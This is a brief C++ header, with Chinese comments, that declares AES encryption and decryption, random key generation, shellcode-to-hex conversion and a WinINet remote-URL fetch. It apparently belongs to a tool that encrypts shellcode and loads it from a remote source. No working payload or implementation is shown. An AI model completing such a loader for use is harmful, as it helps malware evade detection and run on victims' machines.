#include "AES.h"
#include "Base64.h"
#include <iostream>
#include <random>
#include <sstream>
#include <iomanip>
#include <Windows.h>
#include <tchar.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

//AES加密
string EncryptionAES(const string& strSrc, const char* g_key, const char* g_iv);

//AES解密
string DecryptionAES(const string& strSrc, const char* g_key, const char* g_iv);

//生成随机密钥
string random_string(size_t length);

//将char类型的shellcode转换成string类型的
string toHexString(unsigned char* data, size_t len);

//获取远程url内容
LPSTR GetInterNetURLText(LPSTR lpcInterNetURL, unsigned char* buff);
